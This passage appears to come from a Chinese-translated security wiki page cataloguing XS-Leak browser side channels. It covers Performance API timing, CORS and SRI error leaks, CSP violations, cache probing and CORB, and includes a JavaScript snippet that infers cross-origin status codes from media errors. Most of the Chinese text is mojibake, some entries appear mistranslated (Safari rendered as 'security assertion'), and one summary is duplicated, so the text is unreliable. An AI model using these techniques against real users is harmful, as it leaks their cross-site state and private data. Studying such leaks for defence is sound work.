åœ¨å®‰å…¨æ–­è¨€ï¼ˆSAï¼‰ä¸­ï¼ŒXSSå®¡è®¡æœ€åˆæ—¨åœ¨é˜²æ­¢è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰æ”»å‡»ï¼Œä½†å´å¯ä»¥è¢«åˆ©ç”¨æ¥æ³„æ¼æ•æ„Ÿä¿¡æ¯ã€‚å°½ç®¡è¿™ä¸€å†…ç½®åŠŸèƒ½å·²ä»Google Chromeï¼ˆGCï¼‰ä¸­ç§»é™¤ï¼Œä½†ä»å­˜åœ¨äºSAä¸­ã€‚2013å¹´ï¼ŒBraunå’ŒHeiderichè¯æ˜XSSå®¡è®¡å¯èƒ½æ— æ„ä¸­é˜»æ­¢åˆæ³•è„šæœ¬ï¼Œå¯¼è‡´è¯¯æŠ¥ã€‚åŸºäºæ­¤ï¼Œç ”ç©¶äººå‘˜å¼€å‘äº†æŠ€æœ¯æ¥æå–ä¿¡æ¯å¹¶æ£€æµ‹è·¨æºé¡µé¢ä¸Šçš„ç‰¹å®šå†…å®¹ï¼Œè¿™æ˜¯ä¸€ç§ç§°ä¸ºXS-Leaksçš„æ¦‚å¿µï¼Œæœ€åˆç”±TeradaæŠ¥å‘Šï¼Œç”±Heyesåœ¨åšå®¢æ–‡ç« ä¸­è¯¦ç»†è¯´æ˜ã€‚å°½ç®¡è¿™äº›æŠ€æœ¯ç‰¹å®šäºGCä¸­çš„XSSå®¡è®¡ï¼Œä½†å‘ç°åœ¨SAä¸­ï¼Œè¢«XSSå®¡è®¡é˜»æ­¢çš„é¡µé¢ä¸ä¼šåœ¨æ€§èƒ½APIä¸­ç”Ÿæˆæ¡ç›®ï¼Œæ­ç¤ºäº†ä¸€ç§ä»ç„¶å¯èƒ½æ³„æ¼æ•æ„Ÿä¿¡æ¯çš„æ–¹æ³•ã€‚

### X-Frameæ³„æ¼

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šå¤´éƒ¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **æ‘˜è¦**ï¼šå…·æœ‰X-Frame-Optionså¤´çš„èµ„æºä¸ä¼šåˆ›å»ºèµ„æºå®šæ—¶æ¡ç›®ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

å¦‚æœé¡µé¢**ä¸å…è®¸**åœ¨**iframe**ä¸­**å‘ˆç°**ï¼Œåˆ™ä¸ä¼šåˆ›å»ºæ€§èƒ½æ¡ç›®ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥æ£€æµ‹å“åº”å¤´éƒ¨\*\*`X-Frame-Options`**ã€‚**\
**å¦‚æœä½¿ç”¨**åµŒå…¥\*\* **æ ‡ç­¾**ä¹Ÿä¼šå‘ç”ŸåŒæ ·çš„æƒ…å†µã€‚

### ä¸‹è½½æ£€æµ‹

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šå¤´éƒ¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **æ‘˜è¦**ï¼šä¸‹è½½ä¸ä¼šåœ¨æ€§èƒ½APIä¸­åˆ›å»ºèµ„æºå®šæ—¶æ¡ç›®ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

ç±»ä¼¼äºæ‰€æè¿°çš„XS-Leakï¼Œç”±äºContentDispositionå¤´éƒ¨è€Œ**ä¸‹è½½çš„èµ„æº**ä¹Ÿ**ä¸ä¼šåˆ›å»ºæ€§èƒ½æ¡ç›®**ã€‚è¿™ç§æŠ€æœ¯é€‚ç”¨äºæ‰€æœ‰ä¸»è¦æµè§ˆå™¨ã€‚

### é‡å®šå‘å¼€å§‹æ³„æ¼

* **åŒ…å«æ–¹æ³•**: æ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**: é‡å®šå‘
* **æ›´å¤šä¿¡æ¯**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **æ‘˜è¦**: èµ„æºæ—¶é—´è®°å½•æ³„æ¼äº†é‡å®šå‘çš„å¼€å§‹æ—¶é—´ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ª XS-Leak å®ä¾‹ï¼Œæ»¥ç”¨äº†ä¸€äº›æµè§ˆå™¨çš„è¡Œä¸ºï¼Œè¿™äº›æµè§ˆå™¨ä¸ºè·¨æºè¯·æ±‚è®°å½•äº†è¿‡å¤šä¿¡æ¯ã€‚æ ‡å‡†å®šä¹‰äº†ä¸€ç»„åº”è¯¥ä¸ºè·¨æºèµ„æºè®¾ç½®ä¸ºé›¶çš„å±æ€§ã€‚ç„¶è€Œï¼Œåœ¨ **SA** ä¸­ï¼Œå¯ä»¥é€šè¿‡æŸ¥è¯¢ **Performance API** å¹¶æ£€æŸ¥ **redirectStart æ—¶é—´æ•°æ®** æ¥æ£€æµ‹ç”¨æˆ·æ˜¯å¦è¢«ç›®æ ‡é¡µé¢ **é‡å®šå‘**ã€‚

### é‡å®šå‘æŒç»­æ—¶é—´æ³„æ¼

* **åŒ…å«æ–¹æ³•**: Fetch API
* **å¯æ£€æµ‹å·®å¼‚**: é‡å®šå‘
* **æ›´å¤šä¿¡æ¯**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **æ‘˜è¦**: å½“å‘ç”Ÿé‡å®šå‘æ—¶ï¼Œæ—¶é—´è®°å½•çš„æŒç»­æ—¶é—´ä¸ºè´Ÿæ•°ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

åœ¨ GC ä¸­ï¼Œå¯¼è‡´ **é‡å®šå‘** çš„è¯·æ±‚çš„ **æŒç»­æ—¶é—´** ä¸º **è´Ÿæ•°**ï¼Œå› æ­¤å¯ä»¥ä¸ä¸å¯¼è‡´é‡å®šå‘çš„è¯·æ±‚åŒºåˆ†å¼€æ¥ã€‚

### CORP æ³„æ¼

* **åŒ…å«æ–¹æ³•**: æ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**: å¤´éƒ¨
* **æ›´å¤šä¿¡æ¯**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **æ‘˜è¦**: å— CORP ä¿æŠ¤çš„èµ„æºä¸ä¼šåˆ›å»ºèµ„æºæ—¶é—´è®°å½•ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œ**nextHopProtocol æ¡ç›®** å¯ä»¥ç”¨ä½œæ³„æ¼æŠ€æœ¯ã€‚åœ¨ GC ä¸­ï¼Œå½“è®¾ç½®äº† **CORP å¤´éƒ¨** æ—¶ï¼Œ**nextHopProtocol** å°†ä¸ºç©ºã€‚è¯·æ³¨æ„ï¼Œå¯¹äºå¯ç”¨ CORP çš„èµ„æºï¼ŒSA å°†ä¸ä¼šä¸ºå…¶åˆ›å»ºæ€§èƒ½æ¡ç›®ã€‚

### æœåŠ¡å·¥ä½œè€…

* **åŒ…å«æ–¹æ³•**: æ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**: API ä½¿ç”¨
* **æ›´å¤šä¿¡æ¯**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **æ‘˜è¦**: æ£€æµ‹ç‰¹å®šæ¥æºæ˜¯å¦æ³¨å†Œäº†æœåŠ¡å·¥ä½œè€…ã€‚
* **ä»£ç ç¤ºä¾‹**:

æœåŠ¡å·¥ä½œè€…æ˜¯ä»¥äº‹ä»¶é©±åŠ¨çš„è„šæœ¬ä¸Šä¸‹æ–‡ï¼Œåœ¨ä¸€ä¸ªæ¥æºä¸Šè¿è¡Œã€‚å®ƒä»¬åœ¨ç½‘é¡µçš„åå°è¿è¡Œï¼Œå¯ä»¥æ‹¦æˆªã€ä¿®æ”¹å’Œ **ç¼“å­˜èµ„æº** ä»¥åˆ›å»ºç¦»çº¿ç½‘ç»œåº”ç”¨ã€‚\
å¦‚æœé€šè¿‡ **iframe** è®¿é—®äº†ç”± **æœåŠ¡å·¥ä½œè€…** ç¼“å­˜çš„ **èµ„æº**ï¼Œåˆ™è¯¥èµ„æºå°†ä»æœåŠ¡å·¥ä½œè€…ç¼“å­˜ä¸­ **åŠ è½½**ã€‚\
è¦æ£€æµ‹èµ„æºæ˜¯å¦ä»æœåŠ¡å·¥ä½œè€…ç¼“å­˜ä¸­åŠ è½½ï¼Œå¯ä»¥ä½¿ç”¨ **Performance API**ã€‚\
è¿™ä¹Ÿå¯ä»¥é€šè¿‡å®šæ—¶æ”»å‡»æ¥å®ç°ï¼ˆæŸ¥çœ‹è®ºæ–‡è·å–æ›´å¤šä¿¡æ¯ï¼‰ã€‚

### ç¼“å­˜

* **åŒ…å«æ–¹æ³•**: Fetch API
* **å¯æ£€æµ‹å·®å¼‚**: æ—¶é—´
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **æ‘˜è¦**: å¯ä»¥æ£€æŸ¥èµ„æºæ˜¯å¦å­˜å‚¨åœ¨ç¼“å­˜ä¸­ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

ä½¿ç”¨ [Performance API](./#performance-api) å¯ä»¥æ£€æŸ¥èµ„æºæ˜¯å¦å·²ç¼“å­˜ã€‚

### ç½‘ç»œæŒç»­æ—¶é—´

* **åŒ…å«æ–¹æ³•**: Fetch API
* **å¯æ£€æµ‹å·®å¼‚**: é¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **æ‘˜è¦**: å¯ä»¥ä» `performance` API ä¸­æ£€ç´¢è¯·æ±‚çš„ç½‘ç»œæŒç»­æ—¶é—´ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## é”™è¯¯æ¶ˆæ¯æŠ€æœ¯

### åª’ä½“é”™è¯¯

* **åŒ…å«æ–¹æ³•**: HTML å…ƒç´ ï¼ˆè§†é¢‘ï¼ŒéŸ³é¢‘ï¼‰
* **å¯æ£€æµ‹å·®å¼‚**: çŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **æ‘˜è¦**: åœ¨ Firefox ä¸­ï¼Œå¯ä»¥å‡†ç¡®æ³„æ¼è·¨æºè¯·æ±‚çš„çŠ¶æ€ç ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)

```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```

### CORSé”™è¯¯

* **åŒ…å«æ–¹æ³•**ï¼šFetch API
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ ‡å¤´
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **æ‘˜è¦**ï¼šåœ¨å®‰å…¨æ–­è¨€ï¼ˆSAï¼‰ä¸­ï¼ŒCORSé”™è¯¯æ¶ˆæ¯æ— æ„ä¸­æš´éœ²äº†é‡å®šå‘è¯·æ±‚çš„å®Œæ•´URLã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

è¿™ç§æŠ€æœ¯ä½¿æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡åˆ©ç”¨åŸºäºWebkitçš„æµè§ˆå™¨å¤„ç†CORSè¯·æ±‚çš„æ–¹å¼ï¼Œ**æå–è·¨æºç«™ç‚¹é‡å®šå‘çš„ç›®æ ‡**ã€‚å…·ä½“æ¥è¯´ï¼Œå½“å‘å‘å‡ºåŸºäºç”¨æˆ·çŠ¶æ€çš„é‡å®šå‘çš„ç›®æ ‡ç«™ç‚¹å‘é€**å¯ç”¨CORSçš„è¯·æ±‚**ï¼Œå¹¶ä¸”æµè§ˆå™¨éšåæ‹’ç»è¯¥è¯·æ±‚æ—¶ï¼Œé”™è¯¯æ¶ˆæ¯ä¸­ä¼šæŠ«éœ²**é‡å®šå‘ç›®æ ‡çš„å®Œæ•´URL**ã€‚è¿™ç§æ¼æ´ä¸ä»…æ­ç¤ºäº†é‡å®šå‘çš„äº‹å®ï¼Œè¿˜æš´éœ²äº†é‡å®šå‘çš„ç»ˆç‚¹ä»¥åŠå¯èƒ½åŒ…å«çš„ä»»ä½•**æ•æ„ŸæŸ¥è¯¢å‚æ•°**ã€‚

### SRIé”™è¯¯

* **åŒ…å«æ–¹æ³•**ï¼šFetch API
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ ‡å¤´
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **æ‘˜è¦**ï¼šåœ¨å®‰å…¨æ–­è¨€ï¼ˆSAï¼‰ä¸­ï¼ŒCORSé”™è¯¯æ¶ˆæ¯æ— æ„ä¸­æš´éœ²äº†é‡å®šå‘è¯·æ±‚çš„å®Œæ•´URLã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

æ”»å‡»è€…å¯ä»¥åˆ©ç”¨**å†—é•¿çš„é”™è¯¯æ¶ˆæ¯**æ¨æ–­è·¨æºå“åº”çš„å¤§å°ã€‚è¿™æ˜¯ç”±äºå­èµ„æºå®Œæ•´æ€§ï¼ˆSRIï¼‰çš„æœºåˆ¶ï¼Œå®ƒä½¿ç”¨å®Œæ•´æ€§å±æ€§éªŒè¯ä»CDNç­‰åœ°æ–¹è·å–çš„èµ„æºæ˜¯å¦è¢«ç¯¡æ”¹ã€‚ä¸ºäº†ä½¿SRIåœ¨è·¨æºèµ„æºä¸Šèµ·ä½œç”¨ï¼Œè¿™äº›èµ„æºå¿…é¡»æ˜¯**å¯ç”¨CORSçš„**ï¼›å¦åˆ™ï¼Œå®ƒä»¬ä¸ä¼šå—åˆ°å®Œæ•´æ€§æ£€æŸ¥ã€‚åœ¨å®‰å…¨æ–­è¨€ï¼ˆSAï¼‰ä¸­ï¼Œå°±åƒCORSé”™è¯¯XS-Leakä¸€æ ·ï¼Œå¯ä»¥åœ¨å¸¦æœ‰å®Œæ•´æ€§å±æ€§çš„fetchè¯·æ±‚å¤±è´¥åæ•è·é”™è¯¯æ¶ˆæ¯ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸ºä»»ä½•è¯·æ±‚çš„å®Œæ•´æ€§å±æ€§åˆ†é…**è™šå‡å“ˆå¸Œå€¼**æ¥æ•…æ„**è§¦å‘æ­¤é”™è¯¯**ã€‚åœ¨SAä¸­ï¼Œäº§ç”Ÿçš„é”™è¯¯æ¶ˆæ¯æ— æ„ä¸­æ­ç¤ºäº†æ‰€è¯·æ±‚èµ„æºçš„å†…å®¹é•¿åº¦ã€‚è¿™ç§ä¿¡æ¯æ³„æ¼ä½¿æ”»å‡»è€…èƒ½å¤Ÿè¾¨åˆ«å“åº”å¤§å°çš„å˜åŒ–ï¼Œä¸ºå¤æ‚çš„XS-Leakæ”»å‡»é“ºå¹³äº†é“è·¯ã€‚

### CSPè¿è§„/æ£€æµ‹

* **åŒ…å«æ–¹æ³•**ï¼šå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**ï¼šçŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**ï¼š[https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **æ‘˜è¦**ï¼šå¦‚æœæˆ‘ä»¬è®¿é—®çš„å—å®³è€…ç½‘ç«™å°è¯•é‡å®šå‘åˆ°ä¸åŒçš„åŸŸï¼ŒCSPå°†è§¦å‘å¯æ£€æµ‹çš„é”™è¯¯ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

XS-Leakå¯ä»¥ä½¿ç”¨CSPæ£€æµ‹è·¨æºç«™ç‚¹æ˜¯å¦è¢«é‡å®šå‘åˆ°ä¸åŒçš„æºã€‚æ­¤æ³„æ¼å¯ä»¥æ£€æµ‹é‡å®šå‘ï¼Œä½†å¦å¤–ï¼Œé‡å®šå‘ç›®æ ‡çš„åŸŸä¹Ÿä¼šæ³„æ¼ã€‚è¿™ç§æ”»å‡»çš„åŸºæœ¬æ€æƒ³æ˜¯**åœ¨æ”»å‡»è€…ç«™ç‚¹ä¸Šå…è®¸ç›®æ ‡åŸŸ**ã€‚ä¸€æ—¦å‘ç›®æ ‡åŸŸå‘å‡ºè¯·æ±‚ï¼Œå®ƒ**é‡å®šå‘**åˆ°ä¸€ä¸ªè·¨æºåŸŸã€‚**CSPé˜»æ­¢**å¯¹å…¶çš„è®¿é—®å¹¶åˆ›å»ºç”¨ä½œæ³„æ¼æŠ€æœ¯çš„**è¿è§„æŠ¥å‘Š**ã€‚æ ¹æ®æµè§ˆå™¨çš„ä¸åŒï¼Œ**æ­¤æŠ¥å‘Šå¯èƒ½ä¼šæ³„éœ²é‡å®šå‘çš„ç›®æ ‡ä½ç½®**ã€‚\
ç°ä»£æµè§ˆå™¨ä¸ä¼šæŒ‡ç¤ºé‡å®šå‘åˆ°çš„URLï¼Œä½†æ‚¨ä»ç„¶å¯ä»¥æ£€æµ‹åˆ°è§¦å‘äº†è·¨æºé‡å®šå‘ã€‚

### ç¼“å­˜

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶ï¼Œå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **æ‘˜è¦**ï¼šæ¸…é™¤ç¼“å­˜ä¸­çš„æ–‡ä»¶ã€‚æ‰“å¼€ç›®æ ‡é¡µé¢æ£€æŸ¥ç¼“å­˜ä¸­æ˜¯å¦å­˜åœ¨è¯¥æ–‡ä»¶ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š

æµè§ˆå™¨å¯èƒ½ä¸ºæ‰€æœ‰ç½‘ç«™ä½¿ç”¨ä¸€ä¸ªå…±äº«ç¼“å­˜ã€‚æ— è®ºå…¶æ¥æºå¦‚ä½•ï¼Œéƒ½å¯ä»¥æ¨æ–­ç›®æ ‡é¡µé¢æ˜¯å¦**è¯·æ±‚äº†ç‰¹å®šæ–‡ä»¶**ã€‚

å¦‚æœé¡µé¢ä»…åœ¨ç”¨æˆ·ç™»å½•æ—¶åŠ è½½å›¾åƒï¼Œæ‚¨å¯ä»¥**ä½¿èµ„æºæ— æ•ˆ**ï¼ˆå› æ­¤å¦‚æœå·²ç¼“å­˜ï¼Œåˆ™ä¸å†ç¼“å­˜ï¼Œè¯·å‚é˜…æ›´å¤šä¿¡æ¯é“¾æ¥ï¼‰ï¼Œ**æ‰§è¡Œå¯èƒ½åŠ è½½è¯¥èµ„æºçš„è¯·æ±‚**ï¼Œå¹¶å°è¯•ä½¿ç”¨**é”™è¯¯è¯·æ±‚**åŠ è½½èµ„æºï¼ˆä¾‹å¦‚ä½¿ç”¨è¿‡é•¿çš„å¼•ç”¨è€…æ ‡å¤´ï¼‰ã€‚å¦‚æœèµ„æºåŠ è½½**æ²¡æœ‰è§¦å‘ä»»ä½•é”™è¯¯**ï¼Œé‚£æ˜¯å› ä¸ºå®ƒè¢«**ç¼“å­˜**äº†ã€‚

### CSPæŒ‡ä»¤

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ ‡å¤´
* **æ›´å¤šä¿¡æ¯**ï¼š[https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **æ‘˜è¦**ï¼šCSPæ ‡å¤´æŒ‡ä»¤å¯ä»¥é€šè¿‡CSP iframeå±æ€§è¿›è¡Œæ¢æµ‹ï¼Œæ­ç¤ºç­–ç•¥ç»†èŠ‚ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Google Chromeï¼ˆGCï¼‰ä¸­çš„ä¸€é¡¹æ–°åŠŸèƒ½å…è®¸ç½‘é¡µé€šè¿‡åœ¨iframeå…ƒç´ ä¸Šè®¾ç½®å±æ€§æ¥**æå‡ºå†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰**ï¼Œå¹¶éšHTTPè¯·æ±‚ä¼ è¾“ç­–ç•¥æŒ‡ä»¤ã€‚é€šå¸¸ï¼ŒåµŒå…¥å†…å®¹å¿…é¡»é€šè¿‡HTTPæ ‡å¤´**æˆæƒ**ï¼Œå¦åˆ™å°†æ˜¾ç¤º**é”™è¯¯é¡µé¢**ã€‚ä½†æ˜¯ï¼Œå¦‚æœiframeå·²ç»å—CSPæ§åˆ¶ï¼Œå¹¶ä¸”æ–°æå‡ºçš„ç­–ç•¥ä¸æ¯”åŸæ¥æ›´ä¸¥æ ¼ï¼Œé¡µé¢å°†æ­£å¸¸åŠ è½½ã€‚è¿™ç§æœºåˆ¶ä¸ºæ”»å‡»è€…æ‰“å¼€äº†ä¸€æ¡è·¯å¾„ï¼Œå¯ä»¥é€šè¿‡è¯†åˆ«é”™è¯¯é¡µé¢**æ£€æµ‹è·¨æºé¡µé¢çš„ç‰¹å®šCSPæŒ‡ä»¤**ã€‚å°½ç®¡æ­¤æ¼æ´è¢«æ ‡è®°ä¸ºå·²ä¿®å¤ï¼Œä½†æˆ‘ä»¬çš„å‘ç°æ­ç¤ºäº†ä¸€ç§**æ–°çš„æ³„æ¼æŠ€æœ¯**ï¼Œèƒ½å¤Ÿæ£€æµ‹é”™è¯¯é¡µé¢ï¼Œè¡¨æ˜æ ¹æœ¬é—®é¢˜ä»æœªå®Œå…¨è§£å†³ã€‚

### **CORP**

* **åŒ…å«æ–¹æ³•**ï¼šFetch API
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ ‡å¤´
* **æ›´å¤šä¿¡æ¯**ï¼š[**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **æ‘˜è¦**ï¼šå—Cross-Origin Resource Policyï¼ˆCORPï¼‰ä¿æŠ¤çš„èµ„æºåœ¨ä»ä¸å…è®¸çš„æ¥æºè·å–æ—¶ä¼šæŠ›å‡ºé”™è¯¯ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORPæ ‡å¤´æ˜¯ä¸€ä¸ªç›¸å¯¹è¾ƒæ–°çš„Webå¹³å°å®‰å…¨åŠŸèƒ½ï¼Œå½“è®¾ç½®æ—¶**é˜»æ­¢ä¸å…è®¸çš„æ¥æºçš„no-corsè·¨æºè¯·æ±‚**åˆ°ç»™å®šèµ„æºã€‚å¯ä»¥æ£€æµ‹åˆ°æ ‡å¤´çš„å­˜åœ¨ï¼Œå› ä¸ºå—CORPä¿æŠ¤çš„èµ„æºåœ¨**è·å–æ—¶ä¼šæŠ›å‡ºé”™è¯¯**ã€‚

### CORB

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Summary**: CORBå¯ä»¥å…è®¸æ”»å‡»è€…æ£€æµ‹è¯·æ±‚ä¸­æ˜¯å¦å­˜åœ¨`nosniff`å¤´éƒ¨ã€‚
* **Code Example**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

æŸ¥çœ‹é“¾æ¥ä»¥è·å–æœ‰å…³æ”»å‡»çš„æ›´å¤šä¿¡æ¯ã€‚

### CORS error on Origin Reflection misconfiguration <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Summary**: å¦‚æœOriginå¤´éƒ¨åœ¨`Access-Control-Allow-Origin`å¤´éƒ¨ä¸­è¢«åå°„ï¼Œå°±å¯ä»¥æ£€æŸ¥èµ„æºæ˜¯å¦å·²ç»åœ¨ç¼“å­˜ä¸­ã€‚
* **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

å¦‚æœOriginå¤´éƒ¨åœ¨`Access-Control-Allow-Origin`å¤´éƒ¨ä¸­è¢«åå°„ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ç§è¡Œä¸ºå°è¯•ä»¥CORSæ¨¡å¼è·å–èµ„æºã€‚å¦‚æœæ²¡æœ‰è§¦å‘é”™è¯¯ï¼Œåˆ™è¡¨ç¤ºèµ„æºå·²ä»ç½‘ç»œæ­£ç¡®è·å–ï¼Œå¦‚æœè§¦å‘äº†é”™è¯¯ï¼Œåˆ™è¡¨ç¤ºèµ„æºæ˜¯ä»ç¼“å­˜ä¸­è®¿é—®çš„ï¼ˆé”™è¯¯å‡ºç°æ˜¯å› ä¸ºç¼“å­˜ä¿å­˜äº†å¸¦æœ‰å…è®¸åŸå§‹åŸŸè€Œä¸æ˜¯æ”»å‡»è€…åŸŸçš„CORSå¤´éƒ¨çš„å“åº”ï¼‰ã€‚\
